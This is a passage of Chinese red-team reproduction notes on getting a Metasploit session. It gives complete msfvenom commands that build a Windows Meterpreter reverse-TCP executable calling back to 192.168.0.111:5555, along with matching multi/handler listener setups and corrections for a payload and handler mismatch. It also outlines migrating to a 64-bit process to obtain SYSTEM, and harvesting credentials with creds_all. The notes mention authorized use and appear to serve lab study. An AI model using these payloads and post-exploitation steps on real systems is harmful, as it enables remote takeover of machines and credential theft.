## 4. MSF 上线

### 4.1 原文生成 Payload

```bash
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.111 lport=5555 -f exe -o shell.exe
```

这是 x86 的 stageless Meterpreter Payload。

### 4.2 原文 Handler

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
run
```

这里原文存在不一致：

```text
生成：windows/meterpreter_reverse_tcp        ← x86 stageless
监听：windows/x64/meterpreter/reverse_tcp    ← x64 staged
```

两者名称、架构和 stage 方式都不一致，实际使用时应统一。

### 4.3 推荐修正方案一：x64 staged

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  lhost=192.168.0.111 lport=5555 \
  -f exe -o shell.exe
```

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
set ExitOnSession false
run -j
```

### 4.4 推荐修正方案二：保持 x86 stageless

```bash
msfvenom -p windows/meterpreter_reverse_tcp \
  lhost=192.168.0.111 lport=5555 \
  -f exe -o shell.exe
```

```text
msfconsole
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set lhost 192.168.0.111
set lport 5555
run
```

### 5.3 迁移进程

> 原理和进程选择见 [Meterpreter 架构与 migrate](../../02-知识点/02-红队/后渗透/Meterpreter架构与migrate.md)。

```text

```

原文说明：

- 当前 Meterpreter 是 32 位。
- 需要迁移到 64 位进程。
- 文章环境的 PID 为 500。
- 实际环境必须先执行 `ps`，根据当前进程选择 PID。

迁移后：

```text
获得 SYSTEM 权限
```

## 9. 复现注意

- 原文生成的 Payload 和 Handler 不一致，应统一架构和 stage 类型。
- `migrate 500` 中的 PID 必须根据实际环境重新选择。
- `getsystem` 超时后，可以先收集凭据、进程和网络信息，再决定是否提权。
- `creds_all` 获取的明文密码只在授权环境中使用。
- WebLogic 漏洞利用和远程域控部分缺少命令，不应根据文章标题推测漏洞编号。
